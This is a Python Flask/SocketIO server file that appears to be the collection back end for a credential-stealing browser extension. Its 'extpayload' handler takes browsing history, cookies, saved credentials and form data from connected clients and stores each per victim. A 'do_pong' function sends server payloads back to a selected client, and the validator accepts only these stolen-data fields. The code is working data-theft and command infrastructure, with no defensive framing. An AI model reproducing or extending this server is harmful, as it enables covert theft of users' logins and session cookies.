from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit, send 
from . import database
import json, os
import eventlet
eventlet.monkey_patch(socket = True)
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "secret!")
socketio = SocketIO(app, async_mode='eventlet')
connected_clients = [] #tuples of (clientid, sid)

from . import frontend

"""
Server responses to client: (int status, data) as tuple
http status code, data
"""


def messageReceived(methods=['Get', 'Post']):
    print('message was received!!!')

@socketio.on('my event')
def handle_my_custom_event(json, methods=['Get', 'Post']):
    print('received my event: ' + str(json))
    socketio.emit('my response', json, callback=messageReceived)

@socketio.on('connect', namespace='/socket.io')
def handle_ext_connect():
    print("client connected sid: {}".format(request.sid))
    send('connection successful', room=request.sid)
    """
    data = json.loads(data_json)
    bad = 400, "Invalid payload"
    if validate_payload(data) == 0:
        print("Invalid payload received from client.")
        return bad
    elif data["clientid"] == 0: #new client connection!
        clientid = database.create_new_client(data)
        connected_clients.append((clientid, g.sid))
        resp = database.construct_response(clientid)
        return 201, resp
    else:
        return handle_ext_ping(g.sid, data_json)
    """

@socketio.on('extpayload', namespace='/socket.io')
def handle_ext_ping(data):
    print("client ping sid: {} data: {}".format(request.sid, data))
    clientid = data["clientid"]
    bad = 400, "Invalid payload"
    if validate_payload(data) == 0:
        print("Invalid payload received from client.: {}".format(data))
        emit('message', bad[1], room=request.sid)
    elif data["clientid"] == 0: #new client connection!
        print("Generating new client info")
        clientid = database.create_new_client(data)
        connected_clients.append((clientid, request.sid))
        resp = database.construct_response(clientid)
        emit('srvpayload', resp, room=request.sid)
    else:
        if database.store_history(data["history"], clientid):
            return bad
        for cookie in data["cookies"]:
            if database.store_cookie(cookie, clientid):
                return bad
        for cred in data["creds"]:
            if database.store_credential(cred, clientid):
                return bad
        for form in data["forms"]:
            if database.store_form_data(form, clientid):
                return bad
        emit('json', database.construct_response(clientid), room=request.sid)


def do_pong(clientid, payload):
    sid = [(clientidx, sid) for (clientidx, sid) in connected_clients if clientidx == clientid].pop(0)[1] or None
    if sid == None:
        return -1
    emit('srvpayload', payload, namespace='/socket.io', room=sid)


@socketio.on('disconnect')
def handle_ext_disconnect():
    clientid = [(clientid, sidx) for clientid, sidx in connected_clients if sidx == request.sid][0][0]
    connected_clients.remove((clientid,request.sid))
    database.store_payload(clientid)

def validate_payload(data):
    if (type(data.get("clientid", None)) != int or
        type(data.get("history", None)) != type([]) or
        type(data.get("cookies", None)) != type([]) or
        type(data.get("creds", None)) != type([]) or
        type(data.get("forms", None)) != type([])):
        return 0
    return 1

if __name__ == "__main__":
    with open("../sample_ext_to_srv.json") as f:
        clientid = 123
        data = json.load(f)
        #database.store_form_data(data["forms"][0], clientid)
        #database.store_credential(data["creds"][0], clientid)
        #database.store_cookie(data["cookies"][0], clientid)
        database.store_history(data["history"], clientid)
        #database.create_new_client(data)
        #database.construct_response(clientid)
    socketio.run(app, debug=True, use_reloader=False)
